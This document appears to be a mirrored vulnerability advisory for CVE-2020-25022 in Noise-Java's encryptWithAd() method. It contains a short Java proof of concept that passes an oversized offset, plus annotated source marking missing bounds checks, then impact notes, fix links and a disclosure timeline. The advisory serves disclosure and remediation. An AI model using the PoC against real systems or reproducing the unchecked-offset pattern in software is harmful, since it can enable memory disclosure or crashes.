@@ -1,0 +1,133 @@
+id: 34907
+date: 09/06/2020
+title: Noise-Java AESGCMFallbackCipherState.encryptWithAd() Insufficient Boundary Checks Exploit
+author: Pietro Oliva
+cves: CVE-2020-25022
+
+Vulnerability title: Noise-Java AESGCMFallbackCipherState.encryptWithAd() insufficient boundary checks
+Author: Pietro Oliva
+CVE: CVE-2020-25022
+Vendor: Rhys Weatherley (Creator of Noise Framework's reference implementation in Java)
+Product: Noise-Java 
+Affected version: No version information is currently available.
+Fixed version:    Check latest commit and pull request
+
+Description:
+The issue is located in the AESGCMFallbackCipherState.encryptWithAd() method 
+defined in AESGCMFallbackCipherState.java, where multiple boundary checks are
+performed to prevent invalid length or offsets from being specified for the
+encrypt or copy operation. However, some checks were found to be either 
+incomplete or missing, which would likely lead to the following scenarios:
+- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
+  or negative length (Depending on the underlying JVM's validation).
+- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException 
+
+Impact:
+Further checks might be implemented in the JVM and an exception might be thrown 
+before attempting any operation with invalid arguments.
+If that is not the case, OOB read/write or a silent return on invalid arguments
+might occur. This could in turn lead to arbitrary code execution in the context
+of the JVM, memory disclosure, denial of service, or data loss.
+
+Proof of concept:
+Depending on the JVM, running the following code will result in either OOB read
+(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:
+
+package com.southernstorm.noise.protocol;
+
+public class poc {
+
+    public static void main(String[] args) {
+        byte[] plaintext = "This is my plaintext".getBytes();
+        byte[] ciphertext = new byte[plaintext.length];
+        CipherState cs = new AESGCMFallbackCipherState();
+
+        // Passing a large plaintextOffset should result in  a ShortBufferException
+        //   instead of relying on the JMV's implementation of System.arraycopy.
+        try {
+                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
+        }
+        catch(Exception e){
+                System.out.println("An exception has been thrown: " + e);
+        }
+
+    }
+}
+ 
+
+Evidence:
+
+public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
+        byte[] ciphertext, int ciphertextOffset, int length)
+      throws ShortBufferException {
+    int space;
+    if (ciphertextOffset > ciphertext.length) // BUG: ciphertextOffset could be negative,
+                                              // bypassing this length check
+        space = 0;
+    else
+        space = ciphertext.length - ciphertextOffset; 
+        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it
+                                                      
+    if (!haskey) {
+        if (length > space) // BUG: this check can be bypassed with negative ciphertextOffset
+            throw new ShortBufferException();
+            if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)
+
+            /* Multiple issues here:
+            1. plaintextOffset is never checked. Depending on the JVM's implementation,
+               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or 
+               exception being thrown.
+            2. ciphertextOffset could be negative, bypassing the checks on the length.
+               Depending on the JVM, this could result in OOB read/write or exception being thrown.
+            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
+               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */
+
+                System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
+            return length;
+  }
+        if (space < 16 || length > (space - 16)) // BUG: this can be bypassed with negative length
+            throw new ShortBufferException();
+    setup(ad);
+
+            /* Multiple issues here as well:
+            1. plaintextOffset is never checked. this could result in an exception being thrown
+               by the JVM.
+            2. ciphertextOffset could be negative, bypassing the checks on the length.
+               Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
+            3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy 
+               or exception being thrown. */
+
+    encryptCTR(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
+    ghash.update(ciphertext, ciphertextOffset, length);
+    ghash.pad(ad != null ? ad.length : 0, length);
+    ghash.finish(ciphertext, ciphertextOffset + length, 16);
+    for (int index = 0; index < 16; ++index)
+        ciphertext[ciphertextOffset + length + index] ^= hashKey[index];
+    return length + 16;
+}
+
+As can be seen in the above code, multiple boundary checks are either missing
+or incomplete, allowing for invalid length or offsets to be passed to the JVM's
+implementation of System.arraycopy or other methods that handle encryption. 
+Depending on the JVM in use and how the missing/incomplete checks are exploited,
+this could result in either OOB read/write, silent return, or exception thrown
+by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
+arbitrary code execution in the context of the JVM, or crash. 
+
+Mitigating factors:
+Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and 
+CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
+unhandled exception being thrown and/or crash of the JVM process. 
+
+Remediation:
+The fixes for this vulnerability can be found below:
+https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90 
+https://github.com/rweather/noise-java/pull/12/files
+
+Disclosure timeline:
+28th Aug 2020  - Vulnerability reported to vendor.
+29th Aug 2020  - Patch committed by vendor.
+2nd Sept 2020  - Improvement for this patch provided by vulnerability reporter.
+2nd Sept 2020  - Vulnerability details are made public.
+
+#  0day.today [2023-03-26]  #
